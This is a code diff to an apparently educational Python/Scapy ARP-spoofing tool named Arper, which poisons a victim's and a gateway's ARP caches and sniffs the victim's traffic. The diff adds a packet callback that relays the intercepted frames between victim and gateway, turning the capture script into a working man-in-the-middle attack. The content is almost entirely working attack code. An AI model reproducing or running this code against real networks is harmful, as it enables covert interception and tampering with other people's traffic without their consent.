@@ -14,8 +14,9 @@ def get_mac(targetip):
     return None
 
 
+
 class Arper:
-    def __init__(self, victim, gateway, interface='br0'):
+    def __init__(self, victim, gateway, interface):
         self.victim = victim
         self.victimmac = get_mac(victim)
 
@@ -35,10 +36,8 @@ class Arper:
     def run(self):
         self.poison_thread = Process(target=self.poison)
         self.sniff_thread = Process(target=self.sniff)
-
         self.poison_thread.start()
         self.sniff_thread.start()
-        print('here!!')
 
         try:
             self.sniff_thread.join()
@@ -88,13 +87,24 @@ class Arper:
     
 
     def sniff(self):
-        time.sleep(5)
+        time.sleep(3)
         bpf_filter = f"ip host {self.victim}"
 
-        sniff(filter=bpf_filter,
-          iface=self.interface,
-          prn=lambda pkt: wrpcap('arper.pcap', pkt, append=True))
+        sniff(filter=bpf_filter, iface=self.interface,
+            prn=self.packet_callback)
+        
 
+    def packet_callback(self, packet):
+        # wrpcap('arper.pcap', packet, append=True)
+
+        if packet[Ether].src == self.victimmac:
+            newpkt = Ether(dst=self.gatewaymac) / packet.payload
+            # wrpcap('new_arper.pcap', newpkt, append=True)
+            sendp(newpkt, iface=self.interface)
+        elif packet[Ether].src == self.gatewaymac:
+            newpkt = Ether(dst=self.victimmac) / packet.payload
+            # wrpcap('new_arper.pcap', newpkt, append=True)
+            sendp(newpkt, iface=self.interface)
 
     def restore(self):
         print('Restoring ARP tables...')
